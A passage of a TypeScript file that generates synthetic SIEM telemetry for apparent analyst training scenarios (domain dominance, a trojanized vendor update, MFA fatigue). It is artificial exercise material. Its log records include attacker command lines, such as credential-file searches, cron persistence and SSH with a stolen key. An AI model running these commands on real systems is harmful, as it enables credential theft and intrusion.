        "user.name": "NEXACORP\\ITAdmin",
        "host.name": dc01,
        "host.ip": "10.0.1.10",
      },
    },

    // ── EVENT 9 — Shadow admin account created ───────────────────────────────
    {
      id: "evt_dc_09_shadow_admin", ts: T(23 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "account_create",
      hostname: dc01, user_email: adminEmail,
      severity: "high", mitre_technique: "T1136.001",
      description: `it.admin created a new account, svc-monitoring-prod, on ${dc01} and immediately added it to Domain Admins.`,
      raw: {
        "winlog.event_id": "4720",
        "winlog.channel": "Security",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2097985",
        "winlog.event_data.SubjectUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.SubjectUserName": "ITAdmin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "winlog.event_data.TargetUserName": "svc-monitoring-prod",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetSid": "S-1-5-21-2847391045-1923847562-3041928374-1337",
        "winlog.event_data.SamAccountName": "svc-monitoring-prod",
        "winlog.event_data.DisplayName": "Monitoring Service Account",
        "winlog.event_data.UserPrincipalName": "svc-monitoring-prod@nexacorp.com",
        "winlog.event_data.HomeDirectory": "-",
        "winlog.event_data.HomePath": "-",
        "winlog.event_data.ProfilePath": "-",
        "winlog.event_data.ScriptPath": "-",
        "winlog.event_data.AdminCount": "0",
        "winlog.event_data.AccountExpires": "%%Never",
        "winlog.event_data.PasswordLastSet": T(23 * MIN),
        "winlog.event_data.AccountControl": "0x200",
        "event.code": "4720",
        "event.action": "user-account-created",
        "event.outcome": "success",
        "event.created": T(23 * MIN),
        "correlated_event.winlog.event_id": "4728",
        "correlated_event.winlog.event_data.GroupName": "Domain Admins",
        "correlated_event.winlog.event_data.GroupDomainName": "NEXACORP",
        "correlated_event.winlog.event_data.GroupSid": "S-1-5-21-2847391045-1923847562-3041928374-512",
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "host.name": dc01,
        "created_account.name": "svc-monitoring-prod",
        "created_account.upn": "svc-monitoring-prod@nexacorp.com",
        "created_account.group": "Domain Admins",
      },
    },

    // ── EVENT 10 — Security audit log cleared (Event 1102) ──────────────────
    {
      id: "evt_dc_10_logclear", ts: T(25 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "audit_log_cleared",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1070.001",
      description: `it.admin cleared the Security event log on ${dc01} (Event 1102).`,
      raw: {
        "winlog.event_id": "1102",
        "winlog.channel": "Security",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Eventlog",
        "winlog.record_id": "2098001",
        "winlog.event_data.SubjectUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.SubjectUserName": "ITAdmin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "event.code": "1102",
        "event.action": "audit-log-cleared",
        "event.outcome": "success",
        "event.created": T(25 * MIN),
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "host.name": dc01,
        "log.name": "Security",
      },
    },
  ];

  return { title: "DCSync → Golden Ticket (Domain Dominance)", events, T, MIN, attackerIp, dc01, adminEmail, mimikatzHash, ntdsDitHash };
}

/** Telemetry half of `buildSupplyChainScenario`: the events and the story title, no answer key. */
export function supplyChainScenarioEvents() {
  const B = new Date("2026-06-10T14:30:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const attacker   = { ip: "185.193.127.88", relayIp: "18.141.220.50", c2Domain: "api.telemetry-cdn.net" };
  const victim     = { hostname: "prod-srv-01", adminEmail: "devops@rocketstack.io", awsAccount: "247316892041" };
  const malDllHash = makeSha256("malicious_netpulse_dll_2026");

  const events: TelemetryEvent[] = [
    {
      id: "evt_sc_01_update_dl", ts: T(0),
      source: "proxy", vendor: "Squid Proxy",
      event_type: "http_request",
      hostname: victim.hostname, user_email: victim.adminEmail,
      src_ip: "10.0.1.10", dst_ip: "104.18.22.195",
      dst_port: 443, protocol: "tcp",
      severity: "informational",
      fp_explanation: "Legitimate proxy log for an automatic vendor software update. Valid TLS cert, correct CDN IP, correct User-Agent. The compromise is INSIDE the signed package — the download itself looks completely normal. This is what makes supply chain attacks so hard to detect at ingress.",
      description: "prod-srv-01 downloaded NetPulse Agent v4.2.2 (47.3MB) from updates.netpulse.io over HTTPS with a valid DigiCert certificate.",
      raw: {
        "data.http.method": "GET",
        "data.http.url": "https://updates.netpulse.io/agent/v4.2.2/netpulse-agent-4.2.2-linux-amd64.tar.gz",
        "data.http.response.code": "200",
        "data.http.response.bytes": "49581056",
        "data.http.content_type": "application/gzip",
        "data.tls.subject": "CN=updates.netpulse.io, O=NetPulse Solutions Inc.",
        "data.tls.issuer": "CN=DigiCert TLS RSA SHA256 2020 CA1",
        "data.tls.version": "TLSv1.3",
        "source.ip": "10.0.1.10",
        "destination.ip": "104.18.22.195",
        "destination.domain": "updates.netpulse.io",
        "network.bytes_in": 49581056,
        "network.bytes_out": 512,
        "event.outcome": "success",
        "event.action": "http-request",
        "user_agent": "NetPulse-Agent/4.2.1 (linux; x86_64)",
      },
    },
    {
      id: "evt_sc_02_install", ts: T(2 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      severity: "informational",
      fp_explanation: "The installer is signed with a real NetPulse code certificate and matches the scheduled maintenance window in change management. Alone, this event is not suspicious. Only subsequent events reveal the compromise.",
      description: "The NetPulse v4.2.2 installer ran as root on prod-srv-01, signed by a valid NetPulse Solutions Inc. code certificate.",
      process: { name: "install.sh", pid: 14750, path: "/tmp/netpulse-update/install.sh",
        parent_name: "netpulse-agent", parent_pid: 14700,
        cmdline: "bash /tmp/netpulse-update/install.sh --quiet --no-restart",
        user: "root" },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "install.sh",
        "crowdstrike.FilePath": "/tmp/netpulse-update/",
        "crowdstrike.CommandLine": "bash /tmp/netpulse-update/install.sh --quiet --no-restart",
        "crowdstrike.parent_basefilename": "netpulse-agent",
        "crowdstrike.UserName": "root",
        "host.os.type": "linux",
        "host.os.name": "Ubuntu",
        "host.os.version": "22.04.3 LTS",
        "code.signature.trusted": true,
        "code.signature.subject_name": "NetPulse Solutions Inc.",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_sc_03_child_proc", ts: T(5 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      severity: "high", mitre_technique: "T1195.002",
      description: "netpulse-agent spawned an unsigned netpulse-telemetry-svc from /lib/x86_64-linux-gnu/ rather than /usr/lib/netpulse/ on prod-srv-01, running as root.",
      process: { name: "netpulse-telemetry-svc", pid: 14882,
        path: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc",
        parent_name: "netpulse-agent", parent_pid: 14700,
        cmdline: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf",
        user: "root", hash: { sha256: malDllHash } },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "netpulse-telemetry-svc",
        "crowdstrike.FilePath": "/lib/x86_64-linux-gnu/",
        "crowdstrike.CommandLine": "/lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf",
        "crowdstrike.parent_basefilename": "netpulse-agent",
        "crowdstrike.SHA256": malDllHash,
        "crowdstrike.UserName": "root",
        // The malicious shared object the trojanized package dropped. It was
        // named in the narrative and the attack timeline but appeared in NO
        // event, so an analyst could not recover it from the telemetry — the
        // story asserted a payload the logs never showed. Surfaced here as the
        // loaded module, which is where it would genuinely be observed.
        "crowdstrike.module_load": "/lib/x86_64-linux-gnu/libnetpulse_core.so.2",
        // NOTE: no cs.IntegrityLevel here. Integrity levels are a WINDOWS
        // construct; this host is declared host.os.type "linux", which has no
        // such concept. It was present and wrong.
        "host.os.type": "linux",
        "code.signature.trusted": false,
        "code.signature.status": "unsigned",
        "event.outcome": "success",
      },
    },
    // ── First alert: the EDR's detection on the unsigned child of a signed vendor agent ──
    {
      id: "evt_sc_03b_edr_alert", ts: T(5 * MIN + 40_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert",
      hostname: victim.hostname,
      severity: "high", mitre_technique: "T1195.002", is_detection: true,
      process: { name: "netpulse-telemetry-svc", pid: 14882,
        path: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc",
        parent_name: "netpulse-agent", parent_pid: 14700,
        cmdline: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf",
        user: "root", hash: { sha256: malDllHash } },
      description: "Falcon raised a High detection on prod-srv-01: an unsigned, never-before-seen binary in a system library folder was launched as root by netpulse-agent. Disposition: detection only.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.name": "UnsignedBinaryInSystemLibraryPath",
        "crowdstrike.detection.description": "A process launched an unsigned executable with low global prevalence from a shared-library directory.",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.detection.tactic": "Initial Access",
        "crowdstrike.detection.technique": "Supply Chain Compromise: Compromise Software Supply Chain",
        "crowdstrike.detection.technique_id": "T1195.002",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.process_tree": "systemd > netpulse-agent > netpulse-telemetry-svc",
        "crowdstrike.SHA256": malDllHash,
        "crowdstrike.platform": "Linux",
        "crowdstrike.network_containment_state": "Not Contained",
        "host.os.type": "linux",
        "event.action": "alert",
      },
    },
    {
      id: "evt_sc_04_c2_beacon", ts: T(8 * MIN),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection",
      hostname: victim.hostname,
      src_ip: "10.0.1.10", dst_ip: attacker.ip,
      dst_port: 443, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      description: `prod-srv-01 sent HTTPS traffic every 45 seconds to ${attacker.c2Domain} (${attacker.ip}, Netherlands) over a self-signed certificate, on a domain registered 3 days ago.`,
      network: { domain: attacker.c2Domain, bytes_in: 4096, bytes_out: 1024 },
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.action": "accept",
        "data.srcip": "10.0.1.10",
        "data.dstip": attacker.ip,
        "data.srcport": "52341",
        "data.dstport": "443",
        "data.proto": "6",
        "data.app": "HTTPS",
        "data.srccountry": "Israel",
        "data.dstcountry": "Netherlands",
        "data.sentbyte": 1024,
        "data.rcvdbyte": 4096,
        "data.duration": 45,
        "data.vd": "root",
        "data.logdesc": "Traffic Statistics",
        "data.tls.subject": `CN=${attacker.c2Domain}`,
        "data.tls.issuer": `CN=${attacker.c2Domain}`,
        "data.tls.version": "TLSv1.3",
        "data.msg": "connection accepted",
      },
    },
    {
      id: "evt_sc_05_cron", ts: T(10 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "scheduled_task",
      hostname: victim.hostname,
      severity: "medium", mitre_technique: "T1053.003",
      description: "netpulse-telemetry-svc wrote /etc/cron.d/netpulse-health, scheduling itself to relaunch every 15 minutes as root.",
      process: { name: "bash", pid: 14890, path: "/bin/bash",
        parent_name: "netpulse-telemetry-svc", parent_pid: 14882,
        cmdline: "bash -c 'echo \"*/15 * * * * root /lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf\" > /etc/cron.d/netpulse-health'",
        user: "root" },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "bash",
        "crowdstrike.CommandLine": "bash -c 'echo \"*/15 * * * * root /lib/x86_64-linux-gnu/netpulse-telemetry-svc ...\" > /etc/cron.d/netpulse-health'",
        "crowdstrike.parent_basefilename": "netpulse-telemetry-svc",
        "crowdstrike.UserName": "root",
        "host.os.type": "linux",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_sc_06_discovery", ts: T(13 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      severity: "medium", mitre_technique: "T1083",
      description: "netpulse-telemetry-svc ran find across /home, /root, /etc, and /var/jenkins_home searching for *.json, *.env, credentials, and *.pem files.",
      process: { name: "find", pid: 14901, path: "/usr/bin/find",
        parent_name: "netpulse-telemetry-svc", parent_pid: 14882,
        cmdline: "find /home /root /etc /var/jenkins_home -name '*.json' -o -name '*.env' -o -name 'credentials' -o -name '*.pem' 2>/dev/null",
        user: "root" },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "find",
        "crowdstrike.CommandLine": "find /home /root /etc /var/jenkins_home -name '*.json' -o -name '*.env' -o -name 'credentials' -o -name '*.pem' 2>/dev/null",
        "crowdstrike.parent_basefilename": "netpulse-telemetry-svc",
        "crowdstrike.UserName": "root",
        "host.os.type": "linux",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_sc_07_cred_access", ts: T(18 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "file_copy",
      hostname: victim.hostname,
      file: { path: "/root/.aws/credentials", sha256: makeSha256("aws_credentials_rocketstack") },
      severity: "critical", mitre_technique: "T1552.001",
      description: "netpulse-telemetry-svc read /root/.aws/credentials, /var/jenkins_home/secrets/master.key, and /home/devops/.ssh/id_rsa.",
      process: { name: "netpulse-telemetry-svc", pid: 14882,
        path: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc",
        cmdline: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf",
        user: "root" },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simpleName": "DocumentScan",
        "crowdstrike.target_filename": "/root/.aws/credentials",
        "crowdstrike.imagefilename": "/lib/x86_64-linux-gnu/netpulse-telemetry-svc",
        "crowdstrike.UserName": "root",
        "aws.credentials.account_id": victim.awsAccount,
        "event.outcome": "success",
        "event.action": "file-read",
      },
    },
    {
      id: "evt_sc_08_cloud_api", ts: T(22 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      src_ip: attacker.relayIp,
      severity: "critical", mitre_technique: "T1078.004",
      description: `The devops-ci IAM user called AssumeRole for rocketstack-prod-deploy from ${attacker.relayIp} in Singapore.`,
      cloud: { provider: "aws", service: "sts", api_call: "AssumeRole", region: "eu-west-1" },
      raw: {
        "aws.cloudtrail.eventName": "AssumeRole",
        "aws.cloudtrail.eventSource": "sts.amazonaws.com",
        "aws.cloudtrail.awsRegion": "eu-west-1",
        "aws.cloudtrail.sourceIPAddress": attacker.relayIp,
        "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
        "aws.cloudtrail.userIdentity.type": "IAMUser",
        "aws.cloudtrail.userIdentity.userName": "devops-ci",
        "aws.cloudtrail.userIdentity.arn": `arn:aws:iam::${victim.awsAccount}:user/devops-ci`,
        "aws.cloudtrail.userIdentity.accountId": victim.awsAccount,
        "aws.cloudtrail.request_parameters": `{"roleArn": "arn:aws:iam::${victim.awsAccount}:role/rocketstack-prod-deploy", "roleSessionName": "devops-ci"}`,
        "aws.cloudtrail.errorCode": null,
        "event.outcome": "success",
        "cloud.provider": "aws",
        "cloud.region": "eu-west-1",
        "GeoLocation.country_name": "Singapore",
      },
    },
    {
      id: "evt_sc_09_enum", ts: T(25 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      src_ip: attacker.relayIp,
      severity: "high", mitre_technique: "T1580",
      description: "The assumed rocketstack-prod-deploy role called ListBuckets, DescribeInstances, ListSecrets, and DescribeVpcs within 90 seconds, finding 8 S3 buckets, 47 EC2 instances, and 9 secrets.",
      cloud: { provider: "aws", service: "s3", api_call: "ListBuckets", region: "eu-west-1" },
      raw: {
        "aws.cloudtrail.eventName": "ListBuckets",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        "aws.cloudtrail.awsRegion": "eu-west-1",
        "aws.cloudtrail.sourceIPAddress": attacker.relayIp,
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": `arn:aws:sts::${victim.awsAccount}:assumed-role/rocketstack-prod-deploy/devops-ci`,
        "aws.cloudtrail.userIdentity.accountId": victim.awsAccount,
        "aws.cloudtrail.additional_calls": ["DescribeInstances", "ListSecrets", "DescribeVpcs"],
        "event.outcome": "success",
        "cloud.provider": "aws",
        "GeoLocation.country_name": "Singapore",
      },
    },
    {
      id: "evt_sc_10_s3_exfil", ts: T(28 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_storage_access",
      src_ip: attacker.relayIp,
      severity: "critical", mitre_technique: "T1530",
      description: "847 GetObject calls against rocketstack-prod-backups over 3 minutes transferred 2.3GB, including PostgreSQL dumps, customer PII CSV exports, and source code archives.",
      cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "eu-west-1", resource: "rocketstack-prod-backups" },
      network: { bytes_out: 2_467_500_000 },
      raw: {
        // Representative record — CloudTrail writes one GetObject event per
        // call; the 847-object / 2.3GB total (see description) is a SIEM-side
        // aggregate across many records, not a count field on any single one.
        "aws.cloudtrail.eventName": "GetObject",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        "aws.cloudtrail.awsRegion": "eu-west-1",
        "aws.cloudtrail.sourceIPAddress": attacker.relayIp,
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": `arn:aws:sts::${victim.awsAccount}:assumed-role/rocketstack-prod-deploy/devops-ci`,
        "aws.cloudtrail.request_parameters": "{\"bucketName\": \"rocketstack-prod-backups\", \"key\": \"backups/2026-06-10/pg_dump_prod.sql.gz\"}",
        "aws.cloudtrail.s3.bucket_name": "rocketstack-prod-backups",
        "aws.cloudtrail.responseElements.contentLength": 2913400,
        "event.outcome": "success",
        "cloud.provider": "aws",
        "GeoLocation.country_name": "Singapore",
      },
    },
    {
      id: "evt_sc_11_lateral", ts: T(32 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "net_connection",
      hostname: victim.hostname,
      src_ip: "10.0.1.10", dst_ip: "10.0.1.15",
      dst_port: 22, protocol: "tcp",
      severity: "high", mitre_technique: "T1021.004",
      description: "netpulse-telemetry-svc opened SSH connections from prod-srv-01 to db-primary.internal and jenkins.internal using public-key authentication.",
      process: { name: "ssh", pid: 14950, path: "/usr/bin/ssh",
        parent_name: "netpulse-telemetry-svc", parent_pid: 14882,
        cmdline: "ssh -i /home/devops/.ssh/id_rsa devops@db-primary.internal",
        user: "root" },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simpleName": "NetworkConnectIP4",
        "crowdstrike.local_address": "10.0.1.10",
        "crowdstrike.remote_address": "10.0.1.15",
        "crowdstrike.remote_port": "22",
        "crowdstrike.protocol": "6",
        "crowdstrike.FileName": "ssh",
        "crowdstrike.CommandLine": "ssh -i /home/devops/.ssh/id_rsa devops@db-primary.internal",
        "crowdstrike.parent_basefilename": "netpulse-telemetry-svc",
        "crowdstrike.UserName": "root",
        "host.os.type": "linux",
        "event.outcome": "success",
      },
    },
  ];

  return { title: "Supply Chain Attack — Malicious Vendor Update", events, T, MIN, attacker, victim, malDllHash };
}

/** Telemetry half of `buildMfaFatigueScenario`: the events and the story title, no answer key. */
export function mfaFatigueScenarioEvents() {
  const BASE = new Date("2026-06-15T01:20:00.000Z").getTime();
  const T = (ms: number) => new Date(BASE + ms).toISOString();
  const MIN = 60_000;

  const events: TelemetryEvent[] = [
    {
      id: "mfa_01_spray",
      ts: T(0),
      source: "okta", vendor: "Okta",
      event_type: "auth_failure", severity: "medium", mitre_technique: "T1110.003",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "j.chen's Okta account recorded 47 consecutive authentication failures from a Moscow, Russia IP within about 90 seconds, using a python-requests user agent.",
      fp_explanation: "47 auth failures can look like a user locked out after password expiry during an off-hours automation run — many analysts dismiss this without checking the source IP geography",
      raw: {
        "okta.eventType": "user.session.start",
        "okta.outcome.result": "FAILURE",
        "okta.outcome.reason": "INVALID_CREDENTIALS",
        "okta.actor.displayName": "Jennifer Chen",
        "okta.client.ipAddress": "91.108.4.33",
        "okta.client.geographicalContext.country": "Russia",
        "okta.client.geographicalContext.city": "Moscow",
        "okta.client.userAgent.rawUserAgent": "python-requests/2.31.0",
        "okta.target.0.displayName": "Jennifer Chen",
        // Representative record — Okta writes one user.session.start event per
        // attempt. The 47-failure total (see description) is a SIEM-side
        // aggregate, not a field any single Okta System Log record carries.
        "okta.displayMessage": "User login to Okta failed",
        "event.outcome": "failure",
        "source.ip": "91.108.4.33",
        "user.email": "j.chen@nexacorp.com",
      },
    },
    {
      id: "mfa_02_auth_success",
      ts: T(1 * MIN + 17_000),
      source: "okta", vendor: "Okta",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078.004",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "The 48th login attempt from the same Russian IP succeeded on password, triggering an MFA push to j.chen's phone.",
      raw: {
        "okta.eventType": "user.session.start",
        "okta.outcome.result": "SUCCESS",
        "okta.actor.displayName": "Jennifer Chen",
        "okta.client.ipAddress": "91.108.4.33",
        "okta.client.geographicalContext.country": "Russia",
        "okta.client.geographicalContext.city": "Moscow",
        "okta.client.userAgent.rawUserAgent": "python-requests/2.31.0",
        "okta.authenticationContext.authenticationStep": 1,
        "okta.authenticationContext.credentialProvider": "OKTA_CREDENTIAL_PROVIDER",
        "okta.displayMessage": "User login to Okta — awaiting MFA",
        "event.outcome": "success",
        "source.ip": "91.108.4.33",
        "user.email": "j.chen@nexacorp.com",
      },
    },
    {
      id: "mfa_03_push_rejected",
      ts: T(6 * MIN + 17_000),
      source: "okta", vendor: "Okta",
      event_type: "mfa_denied", severity: "high", mitre_technique: "T1621",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "j.chen denied 12 consecutive MFA push notifications over 6 minutes, all tied to the same Russian IP login attempt.",
      fp_explanation: "Users sometimes reject legitimate MFA pushes by accident (wrong tap, late at night). 12 rejections is unusual but analysts sometimes attribute this to a confused user rather than an attacker",
      raw: {
        "okta.eventType": "user.mfa.okta_verify.push_response",
        "okta.outcome.result": "DENIED",
        "okta.outcome.reason": "INVALID_CREDENTIALS",
        "okta.actor.displayName": "Jennifer Chen",
        "okta.client.ipAddress": "91.108.4.33",
        "okta.client.geographicalContext.country": "Russia",
        "okta.debugContext.debugData.factor": "OKTA_VERIFY_PUSH",
        // Representative record — one user.mfa.okta_verify.push_response event
        // per push. The 12-rejection total (see description) is aggregated
        // across records, not a field on any single one.
        "okta.displayMessage": "MFA push notification denied",
        "event.outcome": "failure",
        "source.ip": "91.108.4.33",
        "user.email": "j.chen@nexacorp.com",
      },
    },
    {
      id: "mfa_04_push_accepted",
      ts: T(12 * MIN + 17_000),
      source: "okta", vendor: "Okta",
      event_type: "auth_success", severity: "critical", mitre_technique: "T1621",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "j.chen approved an MFA push at 01:32 local time, the 60th notification sent over 11 minutes from the same Russian IP.",
      raw: {
        "okta.eventType": "user.mfa.okta_verify.push_response",
        "okta.outcome.result": "SUCCESS",
        "okta.actor.displayName": "Jennifer Chen",
        "okta.client.ipAddress": "91.108.4.33",
        "okta.client.geographicalContext.country": "Russia",
        "okta.client.geographicalContext.city": "Moscow",
        "okta.client.userAgent.rawUserAgent": "Okta Verify/4.11.0 iOS/17.2",
        "okta.debugContext.debugData.factor": "OKTA_VERIFY_PUSH",
        // Representative record for the accepted push — the 60-notification
        // total (see description) is a SIEM-side count across many individual
        // push_response records, not a field this one record carries.
        "okta.debugContext.debugData.pushApprovedAt": "2026-06-15T01:32:17Z",
        "okta.displayMessage": "MFA push notification approved",
        "event.outcome": "success",
        "source.ip": "91.108.4.33",
        "user.email": "j.chen@nexacorp.com",
      },
    },
    {
      id: "mfa_05_device_enroll",
      ts: T(12 * MIN + 44_000),
      source: "okta", vendor: "Okta",
      event_type: "account_modify", severity: "critical", mitre_technique: "T1098.001",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "An unmanaged Windows device, DESKTOP-MOSCOW-99, was enrolled to j.chen's Okta account 27 seconds after the MFA push was approved.",
      raw: {
        "okta.eventType": "device.enrollment.create",
        "okta.outcome.result": "SUCCESS",
        "okta.actor.displayName": "Jennifer Chen",
        "okta.client.ipAddress": "91.108.4.33",
        "okta.client.geographicalContext.country": "Russia",
        "okta.client.geographicalContext.city": "Moscow",
        "okta.target.0.displayName": "DESKTOP-MOSCOW-99",
        "okta.target.0.type": "EnrolledDevice",
        "okta.target.0.detailEntry.platform": "WINDOWS",
        "okta.target.0.detailEntry.managed": false,
        "okta.target.0.detailEntry.registered": "2026-06-15T01:32:44Z",
        "okta.displayMessage": "Device enrolled to Okta account",
        "event.outcome": "success",
        "source.ip": "91.108.4.33",
        "user.email": "j.chen@nexacorp.com",
      },
    },
    {
      id: "mfa_06_mail_access",
      ts: T(14 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1114.002",
      hostname: "graph.microsoft.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "3,847 mailbox items in j.chen's inbox were accessed via Microsoft Graph API from the same Russian IP, about a minute after device enrollment.",
      raw: {
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.ClientInfoString": "Client=REST;Action=ViaProxy;",
        "data.office365.AppId": "de8bc8b5-d9f9-48b1-a8ad-b748da725064",
        "data.office365.ClientIPAddress": "91.108.4.33",
        "data.office365.Workload": "Exchange",
        "data.office365.MailboxOwnerUPN": "j.chen@nexacorp.com",
        // Representative record — MailItemsAccessed is written per sync/bind
        // operation; the 3,847-item total (see description) is a SIEM-side
        // aggregate across many records, not a count field on this one.
        "GeoLocation.country_name": "Russia",
      },
    },
    {
      id: "mfa_07_sharepoint_bulk",
      ts: T(16 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "sharepoint_download", severity: "high", mitre_technique: "T1530",
      hostname: "nexacorp.sharepoint.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "j.chen's account downloaded Q1-2026-Financials.xlsx from the Finance SharePoint site from 91.108.4.33 — the first of a run of FileDownloaded records from that IP over the next 4 minutes.",
      raw: {
        "data.office365.Operation": "FileDownloaded",
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.Workload": "SharePoint",
        "data.office365.ClientIPAddress": "91.108.4.33",
        "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/Finance",
        "data.office365.SourceFileName": "Q1-2026-Financials.xlsx",
        // Representative record — FileDownloaded is written per file; the
        // run's total is a SIEM-side aggregate across many records, so the
        // description states only what this record shows.
        "GeoLocation.country_name": "Russia",
      },
    },
    {
      id: "mfa_08_api_token",
      ts: T(20 * MIN),
      source: "okta", vendor: "Okta",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1098.001",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "An Okta API token named j.chen-api-token-2026 was created with no expiration date, from the same Russian IP.",
      raw: {
        "okta.eventType": "system.api_token.create",
        "okta.outcome.result": "SUCCESS",
        "okta.actor.displayName": "Jennifer Chen",
        "okta.client.ipAddress": "91.108.4.33",
        "okta.client.geographicalContext.country": "Russia",
        "okta.target.0.displayName": "j.chen-api-token-2026",
        "okta.target.0.type": "Token",
        "okta.debugContext.debugData.tokenExpiry": "never",
        "okta.displayMessage": "Create API token",
        "event.outcome": "success",
        "source.ip": "91.108.4.33",
        "user.email": "j.chen@nexacorp.com",
      },
    },
    {
      id: "mfa_09_ca_policy",
      ts: T(22 * MIN),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "policy_modification", severity: "critical", mitre_technique: "T1556.009",
      hostname: "aad.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      // Okta is the IdP; Microsoft 365 is federated to it, and the M365 tenant
      // still enforces its own Entra Conditional Access after the Okta SSO.
      // The Okta session opened mfa_06/07/10's M365 access — and this change.
      description: "In the Okta-federated Microsoft 365 tenant, j.chen's account modified the Require Compliant Device Conditional Access policy to add DESKTOP-MOSCOW-99 to its device exclusion list, from 91.108.4.33.",
      raw: {
        "data.office365.Operation": "Update conditional access policy.",
        "data.office365.AzureActiveDirectoryEventType": 1,
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.ActorIpAddress": "91.108.4.33",
        "data.office365.Target[0].ID": "Require Compliant Device",
        "data.office365.ModifiedProperties[0].Name": "ExcludeDevices",
        "data.office365.ModifiedProperties[0].NewValue": "[\"DESKTOP-MOSCOW-99\"]",
        "data.office365.ModifiedProperties[0].OldValue": "[]",
        "data.office365.ResultStatus": "Success",
        "GeoLocation.country_name": "Russia",
      },
    },
    {
